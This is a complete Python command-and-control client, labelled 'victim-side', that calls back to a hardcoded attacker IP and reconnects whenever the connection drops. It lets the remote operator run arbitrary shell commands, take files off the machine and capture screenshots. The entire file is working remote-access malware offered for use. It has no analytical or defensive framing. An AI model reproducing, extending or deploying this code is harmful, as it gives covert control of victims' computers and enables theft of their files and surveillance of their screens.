#!/usr/bin/env python3
"""
Feature-rich C2 client (victim-side).
Supports command execution, file upload, and screenshot capture.

Dependencies: pyautogui (screenshot only)
  pip install pyautogui
"""

import os
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path

HOST: str = "192.168.1.100"  # Attacker IP
PORT: int = 8000
RECONNECT_DELAY: float = 10.0

# Protocol tags (must match listener)
CMD_UPLOAD = b"\x01"
CMD_SCREENSHOT = b"\x02"
CMD_DONE = b"\x03"
CMD_EXIT = b"\x04"
CMD_OUTPUT = b"\x05"


def send_msg(sock: socket.socket, data: bytes) -> None:
    sock.sendall(struct.pack(">I", len(data)) + data)


def recv_msg(sock: socket.socket) -> bytes:
    raw_len = _recv_exactly(sock, 4)
    msg_len = struct.unpack(">I", raw_len)[0]
    return _recv_exactly(sock, msg_len)


def _recv_exactly(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection closed mid-receive")
        buf += chunk
    return buf


def do_screenshot(sock: socket.socket) -> None:
    try:
        import pyautogui  # type: ignore[import]
        import tempfile

        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
            tmp = f.name
        pyautogui.screenshot(tmp)
        data = Path(tmp).read_bytes()
        Path(tmp).unlink(missing_ok=True)

        send_msg(sock, CMD_SCREENSHOT)
        send_msg(sock, data)
    except Exception:
        send_msg(sock, CMD_OUTPUT)
        send_msg(sock, b"[!] Screenshot failed\n")


def do_upload(sock: socket.socket, filename: str) -> None:
    path = Path(filename)
    if not path.exists():
        send_msg(sock, CMD_OUTPUT)
        send_msg(sock, f"[!] File not found: {filename}\n".encode())
        return
    data = path.read_bytes()
    send_msg(sock, CMD_UPLOAD)
    send_msg(sock, filename.encode())
    send_msg(sock, data)


def do_cd(sock: socket.socket, path: str) -> None:
    try:
        os.chdir(path)
        send_msg(sock, CMD_OUTPUT)
        send_msg(sock, f"{os.getcwd()}\n".encode())
    except OSError as e:
        send_msg(sock, CMD_OUTPUT)
        send_msg(sock, f"cd: {e}\n".encode())


def do_command(sock: socket.socket, command: str) -> None:
    proc = subprocess.run(
        command,
        shell=True,
        capture_output=True,
    )
    output = proc.stdout + proc.stderr
    if output:
        send_msg(sock, CMD_OUTPUT)
        send_msg(sock, output)


def handle_session(sock: socket.socket) -> None:
    while True:
        raw = recv_msg(sock)
        command = raw.decode("utf-8", errors="replace").strip()

        if not command:
            continue
        if command in ("quit", "exit"):
            send_msg(sock, CMD_EXIT)
            return

        if command == "screen":
            do_screenshot(sock)
        elif command.startswith("download "):
            filename = command[9:].strip()
            do_upload(sock, filename)
        elif command.startswith("cd "):
            do_cd(sock, command[3:].strip())
        else:
            do_command(sock, command)

        send_msg(sock, CMD_DONE)


def main() -> None:
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((HOST, PORT))
                handle_session(sock)
        except (ConnectionRefusedError, ConnectionError, OSError):
            pass
        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
